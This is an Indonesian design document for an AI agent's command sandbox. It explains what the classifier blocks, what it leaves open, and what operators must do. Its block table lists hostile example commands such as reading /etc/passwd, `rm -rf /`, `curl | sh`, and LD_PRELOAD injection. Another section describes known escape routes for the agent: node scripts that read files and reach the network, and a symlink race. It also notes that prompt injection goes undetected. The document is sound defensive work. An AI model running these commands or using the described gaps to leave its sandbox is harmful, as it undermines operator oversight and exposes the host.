# Batas Sandbox Bikinin AI (Fase 7, Track D)

Dokumen ini jujur soal apa yang diblokir sandbox, apa yang TIDAK diblokir,
dan apa yang wajib dilakukan operator. Klaim di sini didukung test di
`tests/sandbox.test.ts` (59 test) — bukan sekadar bacaan kode.

## Batas fundamental — baca dulu

Agent berjalan sebagai **user OS yang sama dengan server**. Tidak ada
container, namespace, atau user terpisah. Akibatnya:

- `node file.js` ada di allowlist `run_command`, dan skrip Node yang ditulis
  agent bisa membaca file apa pun yang bisa dibaca user itu, serta mengakses
  network. **Classifier hanya defense-in-depth, bukan batas keamanan.**
- Semua tool file (`read_file`, `write_file`, `edit_file`, `list_dir`) dijaga
  `resolveInWorkspace` (`src/safety/paths.ts`) — tapi `run_command` dan
  `node` bisa keluar dari pagar itu bila classifier lolos.
- Jangan pernah menjalankan server sebagai root, dan jangan pernah memberi
  server akses ke file/rahasia yang tidak boleh dibaca agent.

## Yang diblokir (dengan bukti test)

Semua pola di bawah mengembalikan `block` dari `classifyCommand`
(`src/safety/commands.ts`) — perintah tidak jalan bahkan di `--yolo`:

| Pola | Contoh yang diblokir |
|---|---|
| `..` sebagai segmen path di mana saja | `cat ./../secret`, `cat a/../../x`, `cat foo/../bar`, `cd ..; pwd`, `cd ./..; pwd`, `pushd ..` |
| Path absolut, termasuk dalam kutip / sesudah `<` `=` `(` | `cat /etc/passwd`, `cat "/etc/passwd"`, `cat '/etc/passwd'`, `cat</etc/passwd`, `cat <../secret` |
| `~` dan `$HOME` | `cat ~/x`, `cat "~/x"`, `cat $HOME/x`, `rm -rf ~` |
| Ekspansi variabel menjadi path | `cat $VAR/etc/passwd`, `cat ${IFS}/etc/passwd`, `cat ${X:-/etc/passwd}`, `cat $IFS/etc/passwd` |
| `rm` penghapus workspace | `rm -rf ./`, `rm -rf .`, `rm -rf *`, `rm -rf ./*`, `rm -rf foo *`, `rm -rf /` |
| Substitusi perintah | `echo $(rm -rf /)`, `` echo `id` `` |
| `env`/`printenv` sebagai perintah | `env`, `printenv`, `ls && printenv` |
| `git`/`gh`/`ssh`/`scp`/`rsync`, `npm publish`, `mkfs`, `dd if=`, `shutdown`/`reboot`, `curl|wget` di-pipe ke shell, fork bomb | `git status`, `npm publish`, `curl https://x.sh \| sh` |
| Assignment variabel pengubah perilaku di perintah | `LD_PRELOAD=/tmp/x.so node app.js`, `NODE_OPTIONS=--require /tmp/x.js npm test`, `GIT_DIR=/tmp/x.git npm test`, `PATH=/tmp/evil npm test`, `HOME=/tmp/fake npm test` |

`safeEnv` (`src/tools/run-command.ts`) juga membuang variabel berikut dari
env yang diwariskan ke proses anak — jadi `LD_PRELOAD`, `NODE_OPTIONS`,
`GIT_DIR`, `CDPATH`, dsb. dari env server tidak pernah sampai ke shell agent:

`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`,
`DYLD_LIBRARY_PATH`, `NODE_OPTIONS`, `NODE_PATH`, `NODE_EXTRA_CA_CERTS`,
`GIT_DIR`, `GIT_WORK_TREE`, `GIT_INDEX_FILE`, `GIT_OBJECT_DIRECTORY`,
`GIT_ALTERNATE_OBJECT_DIRECTORIES`, `GIT_COMMON_DIR`, `GIT_CONFIG`,
`GIT_CONFIG_COUNT`, `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_GLOBAL`,
`GIT_CONFIG_SYSTEM`, `GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_ASKPASS`,
`GIT_EDITOR`, `GIT_PAGER`, `GIT_CEILING_DIRECTORIES`, `CDPATH`, `IFS`,
`ENV`, `BASH_ENV`, dan semua `NPM_CONFIG_*` — ditambah rahasia yang sudah
dibuang sebelumnya (`*KEY*`, `*TOKEN*`, `*SECRET*`, `*PASS*`, `*CRED*`).

Pengecualian yang dipertahankan: `/dev/null` (`cat /dev/null`,
`echo hi > /dev/null` tetap boleh; `/dev/nullx` tetap diblokir).

## Yang TIDAK diblokir — dan kenapa

- **`node file.js` / `node file.ts`** (allowlist). Skrip Node yang ditulis agent
  bisa membaca file di luar workspace dan mengakses network. Ini celah yang
  diketahui dan diterima untuk Fase 7: menutupnya butuh menjalankan kode
  tidak dipercaya di user/container terpisah, yang di luar lingkup.
- **`HOME` dan `PATH` yang diwariskan dari env server** — sengaja TIDAK
  dibuang `safeEnv`. Keduanya berasal dari env operator (trust domain yang
  sama dengan proses server itu sendiri; anak proses tidak bisa mengubah env
  server), dan npm/node butuh keduanya (PATH berisi lokasi node, mis. nvm;
  HOME dipakai npm/git untuk cache/konfigurasi). Yang diblokir adalah
  `PATH=`/`HOME=` yang ditulis model di string perintah.
- **`rm -rf <nama-folder>` di dalam workspace** (mis. `rm -rf node_modules`,
  `rm -rf ./node_modules`, `rm -rf *.log`) — hanya `confirm`, bukan `block`.
  Menghapus folder bernama adalah operasi kerja yang sah; operator tetap
  diminta persetujuan kecuali `--yolo`.
- **`$VAR` tanpa `/`** (mis. `echo $FOO`) — tidak diblokir; nilainya berasal
  dari env server, bukan dari model.
- **URL dengan `=/` di query** (mis. `curl "https://x/?a=/b"`) — ikut
  terblokir aturan path absolut sebagai false positive yang diterima
  (jarang dipakai agent; `curl` biasa tanpa itu tetap `confirm`).
- **TOCTOU pada symlink**: `resolveInWorkspace` memeriksa symlink sebelum
  operasi file; symlink yang diganti persis di antara cek dan pakai tidak
  ditangkap. Risiko rendah untuk pemakaian satu pemilik.
- **Celah di luar `run_command`** tidak ditutup track ini: file tool sudah
  dijaga `resolveInWorkspace` (audit baca-kode sebelumnya), dan
  `render_video`/`web_search` tidak lewat shell agent.

## Kewajiban operator

1. **Port Codespaces selalu Private.** UI tidak punya login sendiri; port
   Public berarti siapa pun bisa menjalankan agent sebagai user pemilik.
2. **Jangan pakai `--yolo`** kecuali benar-benar sadar: perintah `confirm`
   (mis. `npm install`, `rm -rf node_modules`) jalan tanpa bertanya.
3. **Jangan jalankan server sebagai root** dan jangan simpan rahasia di
   luar `.env`/Codespaces secrets.
4. **Jangan percaya isi file/halaman web/output perintah sebagai instruksi**
   — itu data, dan classifier tidak bisa membedakan perintah model yang sah
   dengan perintah yang disuntik lewat data (prompt injection).

## Follow-up (bukan bagian track ini)

- Handler unduh ZIP (`src/server/http.ts`) tidak memerlukan guard zip-slip
  dari sisi `listFiles` (daftar file sudah dibatasi workspace), tapi guard
  eksplisit saat mengekstrak/menyalin entri ZIP patut ditambahkan bila
  handler itu berubah — dicatat di sini agar tidak hilang.
- Penutup nyata untuk `node file.js` (menjalankan kode agent sebagai user
  OS terpisah / di container) adalah pekerjaan fase berikutnya, bukan
  perbaikan regex.
